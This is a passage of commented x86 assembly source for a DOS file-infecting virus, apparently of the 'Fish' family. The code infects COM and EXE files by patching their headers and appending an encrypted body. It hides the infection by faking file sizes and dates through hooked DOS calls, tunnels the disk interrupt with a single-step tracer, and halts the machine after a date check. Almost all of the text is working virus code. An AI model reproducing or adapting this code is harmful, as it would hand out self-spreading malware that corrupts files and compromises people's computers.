		mov	ax,[bp+4]
		mov	word ptr ds:data_1e+2,ax	; (0000:000C=7F6h)
loc_60:
		jmp	dos_0F			; (0381)

		db	'FISH'

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_15		proc	near
		call	sub_27			; (0BD0)
		call	sub_16			; (0804)
		mov	exe_flag,1		; (cs:0020)
		cmp	buffer,5A4Dh		; (cs:0E00) 'MZ'
		je	loc_61			; Jump if equal
		cmp	buffer,4D5Ah		; (cs:0E00) 'ZM'
		je	loc_61			; Jump if equal
		dec	exe_flag		; (cs:0020)
		jz	loc_64			; Jump if zero
loc_61:
		mov	ax,data_43		; (cs:0E04=0)
		shl	cx,1			; Shift w/zeros fill
		mul	cx			; dx:ax = reg * ax
		add	ax,200h
		cmp	ax,si
		jb	loc_63			; Jump if below
		mov	ax,data_45		; (cs:0E0A=0)
		or	ax,data_46		; (cs:0E0C=0)
		jz	loc_63			; Jump if zero
		mov	dx,file_pos1+2		; (cs:0EAB=0)
		mov	cx,200h
		mov	ax,file_pos1		; (cs:0EA9=0)
		div	cx			; ax,dx rem=dx:ax/reg
		or	dx,dx			; Zero ?
		jz	loc_62			; Jump if zero
		inc	ax
loc_62:
		mov	data_41,dx		; (cs:0E02=0)
		mov	data_43,ax		; (cs:0E04=0)
		cmp	data_49,1		; (cs:0E14=0)
		je	loc_65			; Jump if equal
		mov	data_49,1		; (cs:0E14=0)
		mov	ax,si
		sub	ax,data_44		; (cs:0E08=0)
		mov	data_50,ax		; (cs:0E16=0)
		add	data_43,7		; (cs:0E04=0)
		mov	data_48,offset buffer	; (cs:0E10=0)
		mov	data_47,ax		; (cs:0E0E=0)
		call	sub_17			; (0866)
loc_63:
		jmp	short loc_65		; (07E6)
loc_64:
		cmp	si,0F00h
		jae	loc_65			; Jump if above or =
		mov	ax,buffer		; (cs:0E00=0)
		mov	data_23,ax		; (cs:0004=0FBE9h)
		add	dx,ax
		mov	ax,buffer+2		; (cs:0E02=0)
		mov	data_24,ax		; (cs:0006=0)
		add	dx,ax
		mov	ax,buffer+4		; (cs:0E04=0)
		mov	data_26,ax		; (cs:0008=0)
		not	ax
		add	dx,ax			; Calc checksum
		jz	loc_65			; Infected ?
		mov	ax,file_attr		; (cs:0EF2=0)
		and	al,4
		jnz	loc_65			; Jump if not zero
		mov	cl,0E9h 		; 'Jmp' opcode
		mov	ax,10h
		mov	byte ptr buffer,cl	; (cs:0E00=0)
		mul	si			; dx:ax = reg * ax
		add	ax,offset virus_entry - 3
		mov	word ptr buffer+1,ax	; (cs:0E01=0)
		mov	ax,buffer		; (cs:0E00=0)
		add	ax,buffer+2		; (cs:0E02=0)
		neg	ax
		not	ax
		mov	data_43,ax		; (cs:0E04=0)
		call	sub_17			; (0866)
loc_65:
		mov	ah,3Eh			; Close a file with handle BX
		call	sub_1			; Call INT 21
		mov	cx,cs:file_attr 	; (cs:0EF2)
		mov	ax,4301h		; Put file attributes
		mov	dx,cs:data_103		; (cs:0EF4=0)
		mov	ds,cs:data_104		; (cs:0EF6=7DBCh)
		call	sub_1			; Call INT 21
		call	sub_28			; Restore INT 13 and INT 24
		retn
sub_15		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_16		proc	near
		push	cs
		mov	ax,5700h		; Get file's date/time
		pop	ds
		call	sub_1			; Call INT 21
		mov	data_54,cx		; (cs:0E29=0)
		mov	ax,4200h		; LSEEK at 0:0
		mov	file_date,dx		; (cs:0E2B=0)
		xor	cx,cx
		xor	dx,dx
		call	sub_1			; Call INT 21
		mov	ah,3Fh			; Read from file with handle
		mov	dx,offset buffer
		mov	cl,1Ch
		call	sub_1			; Call INT 21
		xor	cx,cx
		mov	ax,4200h		; LSEEK at 0:0
		xor	dx,dx
		call	sub_1			; Call INT 21
		mov	cl,1Ch
		mov	ah,3Fh			; Read from file with handle
		mov	dx,offset data_23
		call	sub_1			; Call INT 21
		xor	cx,cx
		mov	ax,4202h		; LSEEK at the end
		mov	dx,cx
		call	sub_1			; Call INT 21
		mov	file_pos1+2,dx		; (cs:0EAB=0)
		mov	file_pos1,ax		; (cs:0EA9=0)
		mov	di,ax
		add	ax,0Fh
		adc	dx,0
		and	ax,0FFF0h
		sub	di,ax
		mov	cx,10h
		div	cx			; ax,dx rem=dx:ax/reg
		mov	si,ax
		retn
sub_16		endp

		db	'PIKE'

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_17		proc	near
		xor	cx,cx
		mov	ax,4200h		; LSEEK at 0:0
		mov	dx,cx
		call	sub_1			; Call INT 21
		mov	cl,1Ch
		mov	ah,40h			; Write to file with handle
		mov	dx,offset buffer
		call	sub_1			; Call INT 21
		mov	ax,10h
		mul	si			; dx:ax = reg * ax
		mov	cx,dx
		mov	dx,ax
		mov	ax,4200h		; LSEEK at the end, paragraph alligned
		call	sub_1			; Call INT 21
		mov	cx,offset buffer
		xor	dx,dx
		add	cx,di
		mov	ah,40h			; Write to file with handle
		mov	byte ptr cs:data_59,1	; (cs:0E33=0)
		push	bx
		call	sub_30			; (0D79) INFECTION!!!
		pop	bx
		mov	cx,data_54		; (cs:0E29=0)
		mov	ax,5701h		; Set file's date/time
		mov	dx,file_date		; (cs:0E2B=0)
		test	dh,80h
		jnz	loc_66			; Year >= 2044 ?
		add	dh,0C8h 		; Year += 100
loc_66: 	call	sub_1			; Call INT 21
		retn
sub_17		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_18		proc	near
		call	sub_5			; Push all in vir's stack
		mov	di,dx
		add	di,0Dh
		push	ds
		pop	es
		jmp	short loc_68		; (08E0)

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_19:
		call	sub_5			; Push all in vir's stack
		push	ds			; DS:DX points to a file name
		pop	es
		mov	cx,50h
		mov	di,dx
		mov	bl,0
		xor	ax,ax			; Zero register
		cmp	byte ptr [di+1],':'
		jne	loc_67			; Jump if not equal
		mov	bl,[di]
		and	bl,1Fh
loc_67:
		mov	cs:drive_num,bl 	; (cs:0E28)
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
loc_68:
		mov	ax,[di-3]
		and	ax,0DFDFh
		add	ah,al
		mov	al,[di-4]
		and	al,0DFh
		add	al,ah
		mov	cs:exe_flag,0		; (cs:0020=0)
		cmp	al,0DFh
		je	loc_69			; Jump if equal
		inc	cs:exe_flag		; (cs:0020=0)
		cmp	al,0E2h
		jne	loc_70			; Jump if not equal
loc_69:
		call	sub_4			; Pop all from vir's stack
		clc				; Clear carry flag
		retn

		db	'MACKEREL'

loc_70:
		call	sub_4			; Pop all from vir's stack
		stc				; Set carry flag
		retn
sub_18		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_20		proc	near
		push	bx
		mov	ah,51h			; Get PSP segment
		call	sub_1			; Call INT 21
		mov	cs:data_77,bx		; (cs:0EA3=0)
		pop	bx
		retn
sub_20		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_21		proc	near
		call	sub_27			; (0BD0)
		push	dx
		mov	ah,36h			; Get disk space
		mov	dl,cs:drive_num 	; (cs:0E28)
		call	sub_1			; Call INT 21
		mul	cx			; dx:ax = reg * ax
		mul	bx			; dx:ax = reg * ax
		mov	bx,dx
		pop	dx
		or	bx,bx			; Zero ?
		jnz	loc_71			; Jump if not zero
		cmp	ax,4000h
		jb	loc_72			; Jump if below
loc_71:
		mov	ax,4300h		; Get file attributes
		call	sub_1			; Call INT 21
		jc	loc_72
		mov	cs:data_103,dx		; (cs:0EF4=0)
		mov	cs:file_attr,cx 	; (cs:0EF2)
		mov	cs:data_104,ds		; (cs:0EF6=7DBCh)
		mov	ax,4301h		; Put file attributes
		xor	cx,cx
		call	sub_1			; Call INT 21
		cmp	byte ptr cs:err_flag,0	; (cs:0EDA=0)
		jne	loc_72
		mov	ax,3D02h		; Open disk file with handle R/W
		call	sub_1			; Call INT 21
		jc	loc_72
		mov	bx,ax
		push	bx
		mov	ah,32h			; Get drive parameter block
		mov	dl,cs:drive_num 	; (cs:0E28)
		call	sub_1			; Call INT 21
		mov	ax,[bx+1Eh]
		mov	cs:data_98,ax		; (cs:0EEC=0)
		pop	bx
		call	sub_28			; Restore INT 13 and INT 24
		retn
loc_72:
		xor	bx,bx			; Zero register
		dec	bx
		call	sub_28			; Restore INT 13 and INT 24
		retn
sub_21		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_22		proc	near
		push	cx
		push	dx
		push	ax
		mov	ax,4400h		; IOCTL - get device info
		call	sub_1			; Call INT 21
		xor	dl,80h
		test	dl,80h
		jz	loc_73			; Jump if zero
		mov	ax,5700h		; Get file's date/time
		call	sub_1			; Call INT 21
		test	dh,80h
loc_73: 	pop	ax
		pop	dx
		pop	cx
		retn
sub_22		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_23		proc	near
		call	sub_5			; Push all in vir's stack
		xor	cx,cx
		mov	ax,4201h		; LSEEK at current position
		xor	dx,dx
		call	sub_1			; Call INT 21
		mov	cs:file_pos+2,dx	; (cs:0EA7=0)
		mov	cs:file_pos,ax		; (cs:0EA5=0)
		mov	ax,4202h		; LSEEK at the end
		xor	cx,cx
		xor	dx,dx
		call	sub_1			; Call INT 21
		mov	cs:file_pos1+2,dx	; (cs:0EAB=0)
		mov	cs:file_pos1,ax 	; (cs:0EA9=0)
		mov	ax,4200h		; LSEEK
		mov	dx,cs:file_pos		; (cs:0EA5=0)
		mov	cx,cs:file_pos+2	; (cs:0EA7=0)
		call	sub_1			; Call INT 21
		call	sub_4			; Pop all from vir's stack
		retn
sub_23		endp

		db	'FISH'

dos_57: 	or	al,al
		jnz	loc_77			; Jump if not zero
		and	cs:data_85,0FFFEh	; (cs:0EB3=0)
		call	sub_3			; Pop flags and registers
		call	sub_1			; Call INT 21
		jc	loc_76			; Jump if carry Set
		test	dh,80h
		jz	loc_75			; Jump if zero
		sub	dh,0C8h
loc_75:
		jmp	loc_27			; (0322)
loc_76:
		or	cs:data_85,1		; (cs:0EB3=0)
		jmp	loc_27			; (0322)
loc_77:
		cmp	al,1
		jne	loc_81			; Jump if not equal
		and	cs:data_85,0FFFEh	; (cs:0EB3=0)
		test	dh,80h
		jz	loc_78			; Jump if zero
		sub	dh,0C8h
loc_78:
		call	sub_22			; (098E)
		jz	loc_79			; Jump if zero
		add	dh,0C8h
loc_79:
		call	sub_1			; Call INT 21
		mov	[bp-4],ax
		adc	cs:data_85,0		; (cs:0EB3=0)
		jmp	dos_0F			; (0381)
dos_42:
		cmp	al,2
		jne	loc_81			; Jump if not equal
		call	sub_22			; (098E)
		jz	loc_81			; Jump if zero
		sub	word ptr [bp-0Ah],0E00h
		sbb	word ptr [bp-8],0
loc_81:
		jmp	loc_26			; (031E)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_24		proc	near
		call	sub_2			; Push flags and registers
		mov	ah,2Ah
		call	sub_1			; Call INT 21
		cmp	cx,7C7h
		jb	loc_82			; Jump if below
		mov	ah,9
		push	cs
		pop	ds
		mov	dx,1ABh
		call	sub_1			; Call INT 21
		hlt				; Halt processor
loc_82:
		call	sub_3			; Pop flags and registers
		retn
sub_24		endp

dos_3F:
		and	byte ptr cs:data_85,0FEh	; (cs:0EB3=0)
		call	sub_22			; (098E)
		jz	loc_81			; Jump if zero
		mov	cs:buf_adr,dx		; (cs:0EAD=0)
		mov	cs:data_83,cx		; (cs:0EAF=0)
		mov	cs:data_84,0		; (cs:0EB1=0)
		call	sub_23			; (09AC)
		mov	ax,cs:file_pos1 	; (cs:0EA9=0)
		mov	dx,cs:file_pos1+2	; (cs:0EAB=0)
		sub	ax,vir_len
		sbb	dx,0
		sub	ax,cs:file_pos		; (cs:0EA5=0)
		sbb	dx,cs:file_pos+2	; (cs:0EA7=0)
		jns	loc_84			; Jump if not sign
		mov	word ptr [bp-4],0
		jmp	loc_43			; (04DD)
loc_84:
		jnz	loc_85			; Jump if not zero
		cmp	ax,cx
		ja	loc_85			; Jump if above
		mov	cs:data_83,ax		; (cs:0EAF=0)
loc_85:
		mov	cx,cs:file_pos+2	; (cs:0EA7=0)
		mov	dx,cs:file_pos		; (cs:0EA5=0)
		or	cx,cx			; Zero ?
		jnz	loc_86			; Jump if not zero
		cmp	dx,1Ch
		jbe	loc_87			; Jump if below or =
loc_86:
		mov	dx,cs:buf_adr		; (cs:0EAD=0)
		mov	ah,3Fh			; Read from file with handle
		mov	cx,cs:data_83		; (cs:0EAF=0)
		call	sub_1			; Call INT 21
		add	ax,cs:data_84		; (cs:0EB1=0)
		mov	[bp-4],ax
		jmp	dos_0F			; (0381)
loc_87:
		mov	di,dx
		mov	si,dx
		add	di,cs:data_83		; (cs:0EAF=0)
		cmp	di,1Ch
		jb	loc_88			; Jump if below
		xor	di,di			; Zero register
		jmp	short loc_89		; (0B02)

		db	'TUNA'

loc_88:
		sub	di,1Ch
		neg	di
loc_89:
		mov	ax,dx
		mov	dx,cs:file_pos1 	; (cs:0EA9=0)
		mov	cx,cs:file_pos1+2	; (cs:0EAB=0)
		add	dx,0Fh
		adc	cx,0
		and	dx,0FFF0h
		sub	dx,vir_end-data_23
		sbb	cx,0
		add	dx,ax
		adc	cx,0
		mov	ax,4200h
		call	sub_1			; Call INT 21
		mov	cx,1Ch
		sub	cx,di
		sub	cx,si
		mov	ah,3Fh
		mov	dx,cs:buf_adr		; (cs:0EAD=0)
		call	sub_1			; Call INT 21
		add	cs:buf_adr,ax		; (cs:0EAD=0)
		sub	cs:data_83,ax		; (cs:0EAF=0)
		add	cs:data_84,ax		; (cs:0EB1=0)
		xor	cx,cx			; Zero register
		mov	ax,4200h
		mov	dx,1Ch
		call	sub_1			; Call INT 21
		jmp	loc_86			; (0ACD)

sub_25:
loc_91: 	and	cs:_null__,sp		; (cs:0E31=0)
		jmp	loc_97			; (0C97)

dos_4E_4F:	and	cs:data_85,0FFFEh	; (cs:0EB3=0)
		call	sub_3			; Pop flags and registers
		call	sub_1			; Call INT 21
		call	sub_2			; Push flags and registers
		jnc	loc_93			; Jump if carry=0
		or	cs:data_85,1		; (cs:0EB3=0)
		jmp	dos_0F			; (0381)
loc_93:
		call	sub_14			; (0515)
		test	byte ptr [bx+19h],80h
		jnz	loc_94			; Jump if not zero
		jmp	dos_0F			; (0381)
loc_94:
		sub	word ptr [bx+1Ah],0E00h
		sbb	word ptr [bx+1Ch],0
		sub	byte ptr [bx+19h],0C8h
		jmp	dos_0F			; (0381)

		db	0EBh

sub_26:
		mov	es,old_DS		; (cs:0E45=26Eh)
		push	es
		pop	ds
		dec	byte ptr ds:PSP_0003	; (026E:0003=0)
		mov	dx,ds
		dec	dx
		mov	ds,dx
		mov	ax,ds:MCB_0003		; (026D:0003=2020h)
		dec	ah
		add	dx,ax
		mov	ds:MCB_0003,ax		; (026D:0003=2020h)
		pop	di
		inc	dx
		mov	es,dx
		push	cs
		pop	ds
		call	sub_29			; (0C97)
		db	0A1h
		mov	si,all_len-2		; (0FFE)
		mov	cx,all_len/2
		mov	di,si
		std				; Set direction flag
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		cld				; Clear direction
		push	es
		mov	ax,offset loc_4_1
		push	ax
		mov	es,cs:old_DS		; (cs:0E45=26Eh)
		retf				; Return far

sub_27:
		mov	byte ptr cs:err_flag,0	; (cs:0EDA)
		call	sub_5			; Push all in vir's stack
		push	cs
		call	sub_25			; (0B57)
		db	088h
		mov	al,13h
		pop	ds
		call	sub_9			; Get INT 13 vector
		mov	INT_13_prt+2,es 	; (cs:0E2F)
		mov	INT_13_prt,bx		; (cs:0E2D)
		mov	word ptr old_I13+2,es	; (cs:0E3B=140Bh)
		mov	dl,2
		mov	word ptr old_I13,bx	; (cs:0E39=0)
		mov	byte ptr data_73,dl	; (cs:0E50=0)
		call	sub_7			; Set INT 01 to tracer
		mov	data_93,sp		; (cs:0EDF)
		mov	data_92,ss		; (cs:0EDD)
		push	cs
		mov	ax,offset loc_95	; 0C29
		push	ax
		mov	ax,70h
		mov	cx,0FFFFh
		mov	es,ax
		xor	di,di			; Zero register
		mov	al,0CBh 		; ret far opcode
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		dec	di
		pushf
		push	es
		push	di
		pushf
		pop	ax
		or	ah,1			; Set TF
		push	ax
		popf
		xor	ax,ax			; Zero register
		jmp	dword ptr INT_13_prt	; (cs:0E2D=0)
loc_95:
		push	cs
		pop	ds
		call	sub_29			; (0C97)
		db	08Ch
		mov	al,13h
		mov	dx,offset INT_13
		call	sub_8			; Set INT 13 vector
		mov	al,24h
		call	sub_9			; Get INT 24 vector
		mov	word ptr old_I24,bx	; (cs:0E3D)
		mov	dx,offset INT_24
		mov	al,24h
		mov	word ptr old_I24+2,es	; (cs:0E3F)
		call	sub_8			; Set INT 24 vector
		call	sub_4			; Pop all from vir's stack
		retn

sub_28:
		call	sub_5			; Push all in vir's stack
		lds	dx,cs:old_I13		; (cs:0E39) Load 32 bit ptr
		mov	al,13h
		call	sub_8			; Set INT 13 vector
		lds	dx,cs:old_I24		; (cs:0E3D) Load 32 bit ptr
		mov	al,24h
		call	sub_8			; Set INT 24 vector
		call	sub_4			; Pop all from vir's stack
		retn

int_1:		push	bp
		mov	bp,sp
		and	word ptr [bp+6],0FEFFh
		inc	word ptr [bp+1Ah]
		pop	bp
		iret

loc_96:
		mov	cs:data_73,401h 	; (cs:0E50=0)
		call	sub_7			; Set INT 01 to tracer
		call	sub_3			; Pop flags and registers
		push	ax
		mov	ax,cs:data_85		; (cs:0EB3=0)
		or	ax,100h
		push	ax
		popf
		pop	ax
		pop	bp
		jmp	dword ptr cs:INT_21_ptr ; (cs:0E35=0)

		db	089h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_29		proc	near
loc_97:
		call	sub_2			; Push flags and registers
		mov	al,1
		mov	dx,offset int_1
		push	cs
		pop	ds
		call	sub_8			; Set INT 01 vector
		pushf
		pop	ax
		or	ax,100h
		push	ax
		popf
		inc	ax
		mul	ax			; dx:ax = reg * ax
		aaa				; Ascii adjust
		mov	_null__,ax		; (cs:0E31=0)
		call	sub_3			; Pop flags and registers
		retn
sub_29		endp

		db	0FFh

tracer: 	push	bp
		mov	bp,sp
		push	ax
		cmp	word ptr [bp+4],0C000h
		jae	loc_99			; Jump if above or =
		mov	ax,cs:data_69		; (cs:0E47)
		cmp	[bp+4],ax		; Is it DOS segment?
		jbe	loc_99			; Jump if below or =
loc_98: 	pop	ax
		pop	bp
		iret
loc_99:
		cmp	byte ptr cs:data_73,1	; (cs:0E50=0)
		je	loc_101 		; Jump if equal
		mov	ax,[bp+4]
		mov	cs:INT_13_prt+2,ax	; (cs:0E2F=SEGMENT)
		mov	ax,[bp+2]
		mov	cs:INT_13_prt,ax	; (cs:0E2D=OFFSET)
		jb	loc_100 		; Jump if below
		pop	ax
		pop	bp
		mov	sp,cs:data_93		; (cs:0EDF=0)
		mov	ss,cs:data_92		; (cs:0EDD=151Ch)
		jmp	loc_95			; (0C29)
loc_100:
		and	word ptr [bp+6],0FEFFh
		jmp	short loc_98		; (0CCB)
loc_101:
		dec	byte ptr cs:data_73+1	; (cs:0E51)
		jnz	loc_98
		and	word ptr [bp+6],0FEFFh	; Stop tracing
		call	sub_5			; Push all in vir's stack
		call	sub_2			; Push flags and registers
		mov	ah,2Ch			; Get current time
		call	sub_1			; Call INT 21
		mov	byte ptr cs:[locloop_102+3],dl	; (cs:0D51=5Dh)
		mov	byte ptr cs:[locloop_103+3],dl	; (cs:0D6E=5Dh)
		sub	ah,2			; ah=2A - Get current date
		call	sub_1			; Call INT 21
		add	dh,dl
		mov	byte ptr cs:[locloop_105+3],dh	; (cs:0D84=15h)
		mov	byte ptr cs:[locloop_109+3],dh	; (cs:0DDC=15h)
		mov	al,3
		call	sub_9			; Get INT 03 vector
		push	es
		pop	ds
		mov	dx,bx
		mov	al,1
		call	sub_8			; Set INT 01 vector
		call	sub_3			; Pop flags and registers
		call	sub_6			; Swap JMP xxxx:xxxx
		call	sub_4			; Pop all from vir's stack
		push	bx
		push	cx
		mov	bx,offset data_311	; (cs:0028=0)
		mov	cx,287h
locloop_102:	xor	byte ptr cs:[bx],5Dh
		add	bx,5
		loop	locloop_102		; Loop if cx > 0
		pop	cx
		pop	bx
		jmp	short loc_100		; (0CF5)

loc_1021:	or	byte ptr cs:data_311,0	; (cs:0028=0)
		jz	loc_104 		; Jump if zero
		push	bx
		push	cx
		mov	bx,offset data_311	; (cs:0028=0)
		mov	cx,287h
locloop_103:	xor	byte ptr cs:[bx],5Dh
		add	bx,5
		loop	locloop_103		; Loop if cx > 0
		pop	cx
		pop	bx
loc_104:	jmp	loc_9			; (026C)


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_30		proc	near
		push	cx
		push	bx
		mov	bx,offset data_311	; (cs:0028=0)
		mov	cx,encr_len
locloop_105:	xor	byte ptr cs:[bx],15h
		inc	bx
		loop	locloop_105		; Loop if cx > 0
		pop	bx
		pop	cx
		call	sub_1			; Call INT 21
		jmp	short virus_entry	; (0DCE)
sub_30		endp

		db	0BAh

INT_13:
		pop	cs:usr_adr		; (cs:0E41=0)
		pop	word ptr cs:usr_adr+2	; (cs:0E43=0)
		pop	cs:data_91		; (cs:0EDB=0)
		and	cs:data_91,0FFFEh	; (cs:0EDB=0)
		cmp	byte ptr cs:err_flag,0	; (cs:0EDA=0)
		jne	loc_106
		push	cs:data_91		; (cs:0EDB=0)
		call	dword ptr cs:INT_13_prt ; (cs:0E2D=0)
		jnc	loc_107
		inc	cs:err_flag		; (cs:0EDA=0)
loc_106:	stc				; Set carry flag
loc_107:	jmp	dword ptr cs:usr_adr	; (cs:0E41=0)

		db	089h

INT_24: 	xor	al,al
		mov	byte ptr cs:err_flag,1	; (cs:0EDA=0)
		iret

virus_entry:	call	sub_31			; (0DD1)
sub_31: 	pop	bx
		sub	bx,sub_31-data_311
		mov	cx,encr_len
locloop_109:	xor	byte ptr cs:[bx],15h
		inc	bx
		loop	locloop_109		; Loop if cx > 0
		dec	byte ptr cs:data_33e[bx]	; (cs:00B3+BX) = cs:0E33
		jz	loc_ret_110		; terminate program and don't run the virus ???
		jmp	loc_7			; (024A)
loc_ret_110:	retn

		db	' FISH FISH FISH FISH '
vir_end:

		org	0E00h

buffer		dw	?
data_41 	dw	?
data_43 	dw	?, ?
data_44 	dw	?
data_45 	dw	?
data_46 	dw	?
data_47 	dw	?
data_48 	dw	?, ?
data_49 	dw	?
data_50 	dw	?
		dw	6 dup (?)
data_51 	dw	?, ?
drive_num	db	?
data_54 	dw	?
file_date	dw	?
INT_13_prt	dw	?, ?
_null__ 	dw	?
data_59 	db	?, ?
INT_21_ptr	dd	?
old_I13 	dd	?
old_I24 	dd	?
usr_adr 	dw	?, ?
old_DS		dw	?
data_69 	dw	?
		dw	?
data_70 	db	?
data_71 	dw	?
data_72 	dw	?
data_73 	dw	?
file_name	db	80 dup (?)
data_76 	db	?
data_77 	dw	?
file_pos	dw	?, ?
file_pos1	dw	?, ?
buf_adr 	dw	?
data_83 	dw	?
data_84 	dw	?
data_85 	dw	?
data_86 	db	14 dup (?)
data_87 	dw	?
data_88 	dd	?
		db	?
data_89 	db	16 dup (?)
err_flag	db	?
data_91 	dw	?
data_92 	dw	?
data_93 	dw	?, ?
old_AX		dw	?
		db	?
data_95 	dw	?
data_96 	dw	?
tmp_adr 	dw	?
data_98 	dw	?
		db	?
data_99 	db	?
data_100	db	?
data_101	db	?
file_attr	dw	?
data_103	dw	?
data_104	dw	?
		db	7 dup(?)
data_105	dw	?
data_106	dw	?
data_107	dd	?
data_109	db	80 dup (?)
old_SP		dw	?
old_SS		dw	?
virus_SP	dw	?

seg_a		ends

		end
